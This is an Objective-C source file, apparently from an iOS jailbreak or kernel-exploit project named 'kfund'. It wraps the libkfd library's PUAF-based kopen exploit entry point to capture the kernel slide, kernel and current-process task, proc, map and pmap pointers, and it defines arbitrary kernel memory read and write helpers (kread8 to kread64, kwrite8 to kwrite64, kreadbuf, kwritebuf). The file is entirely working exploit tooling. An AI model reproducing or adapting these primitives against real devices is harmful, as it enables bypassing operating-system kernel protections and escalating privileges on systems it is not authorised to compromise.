//
//  krw.m
//  kfund
//
//  Created by Seo Hyun-gyu on 1/2/24.
//

#import "krw.h"
#import <Foundation/Foundation.h>
#import "../libkfd/libkfd.h"
#import "offsets.h"

uint64_t _kfd = 0;

uint64_t _self_task = 0;
uint64_t _self_proc = 0;
uint64_t _self_pmap = 0;
uint64_t _self_map = 0;
uint64_t _kslide = 0;
uint64_t _kern_task = 0;
uint64_t _kern_proc = 0;
uint64_t _kern_pmap = 0;
uint64_t _kern_map = 0;
uint64_t _gphysbase = 0;
uint64_t _gphysize = 0;
uint64_t _gcputtep = 0;


uint64_t get_selftask(void) {
    return _self_task;
}

uint64_t get_selfproc(void) {
    return _self_proc;
}

uint64_t get_selfpmap(void) {
    return _self_pmap;
}

uint64_t get_selfmap(void) {
    return _self_map;
}

uint64_t get_kslide(void) {
    return _kslide;
}

uint64_t get_kernproc(void) {
    return _kern_proc;
}

uint64_t get_kernmap(void) {
    return _kern_map;
}

uint64_t get_kernpmap(void) {
    return _kern_pmap;
}

uint64_t get_kerntask(void) {
    return _kern_task;
}

uint64_t get_kernbase(void) {
    return 0xfffffff007004000 + _kslide;
}

uint64_t get_gphysbase(void) {
    return _gphysbase;
}

uint64_t get_gphysize(void) {
    return _gphysize;
}

uint64_t get_gcputtep(void) {
    return _gcputtep;
}

void set_selftask(void) {
    _self_task = ((struct kfd*)_kfd)->info.kernel.current_task;
}

void set_selfproc(void) {
    _self_proc = ((struct kfd*)_kfd)->info.kernel.current_proc;
}

void set_selfpmap(void) {
    _self_pmap = ((struct kfd*)_kfd)->info.kernel.current_pmap;
}

void set_selfmap(void) {
    _self_map = ((struct kfd*)_kfd)->info.kernel.current_map;
}

void set_kslide(void) {
    _kslide = ((struct kfd*)_kfd)->info.kernel.kernel_slide;
}

void set_kernproc(void) {
    _kern_proc = ((struct kfd*)_kfd)->info.kernel.kernel_proc;
}

void set_kernpmap(void) {
    _kern_pmap = ((struct kfd*)_kfd)->info.kernel.kernel_pmap;
}

void set_kernmap(void) {
    _kern_map = ((struct kfd*)_kfd)->info.kernel.kernel_map;
}

void set_kerntask(void) {
    _kern_task = ((struct kfd*)_kfd)->info.kernel.kernel_task;
}

void set_gphysbase(void) {
    _gphysbase = kread64(off_gphysbase + _kslide);
}

void set_gphysize(void) {
    _gphysize = kread64(off_gphysize + _kslide);
}

void set_gcputtep(void) {
    _gcputtep = kread64(off_gcputtep + _kslide);
}

uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
{
    _kfd = kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
    
    set_selftask();
    set_selfproc();
    set_selfpmap();
    set_selfmap();

    set_kerntask();
    set_kernproc();
    set_kernpmap();
    set_kernmap();
        
    set_kslide();
    
    set_gphysbase();
    set_gphysize();
    
    return _kfd;
}

void do_kclose(void)
{
    kclose(_kfd);
}

void do_kread(uint64_t kaddr, void* uaddr, uint64_t size)
{
    kread(_kfd, kaddr, uaddr, size);
}

void do_kwrite(void* uaddr, uint64_t kaddr, uint64_t size)
{
    kwrite(_kfd, uaddr, kaddr, size);
}

uint8_t kread8(uint64_t where) {
    uint8_t out;
    kread(_kfd, where, &out, sizeof(uint8_t));
    return out;
}
uint32_t kread16(uint64_t where) {
    uint16_t out;
    kread(_kfd, where, &out, sizeof(uint16_t));
    return out;
}
uint32_t kread32(uint64_t where) {
    uint32_t out;
    kread(_kfd, where, &out, sizeof(uint32_t));
    return out;
}
uint64_t kread64(uint64_t where) {
    uint64_t out;
    kread(_kfd, where, &out, sizeof(uint64_t));
    return out;
}

void kwrite8(uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kread8(where+1);
    _buf[2] = kread8(where+2);
    _buf[3] = kread8(where+3);
    _buf[4] = kread8(where+4);
    _buf[5] = kread8(where+5);
    _buf[6] = kread8(where+6);
    _buf[7] = kread8(where+7);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kwrite16(uint64_t where, uint16_t what) {
    u16 _buf[4] = {};
    _buf[0] = what;
    _buf[1] = kread16(where+2);
    _buf[2] = kread16(where+4);
    _buf[3] = kread16(where+6);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kwrite32(uint64_t where, uint32_t what) {
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(where+4);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}
void kwrite64(uint64_t where, uint64_t what) {
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    uint64_t endAddr = kaddr + size;
    uint32_t outputOffset = 0;
    unsigned char* outputBytes = (unsigned char*)output;
    
    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t k = kread32(curAddr);

        unsigned char* kb = (unsigned char*)&k;
        for(int i = 0; i < 4; i++)
        {
            if(outputOffset == size) break;
            outputBytes[outputOffset] = kb[i];
            outputOffset++;
        }
        if(outputOffset == size) break;
    }
}

void kwritebuf(uint64_t kaddr, void* input, size_t size)
{
    uint64_t endAddr = kaddr + size;
    uint32_t inputOffset = 0;
    unsigned char* inputBytes = (unsigned char*)input;
    
    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t toWrite = 0;
        int bc = 4;
        
        uint64_t remainingBytes = endAddr - curAddr;
        if(remainingBytes < 4)
        {
            toWrite = kread32(curAddr);
            bc = (int)remainingBytes;
        }
        
        unsigned char* wb = (unsigned char*)&toWrite;
        for(int i = 0; i < bc; i++)
        {
            wb[i] = inputBytes[inputOffset];
            inputOffset++;
        }

        kwrite32(curAddr, toWrite);
    }
}
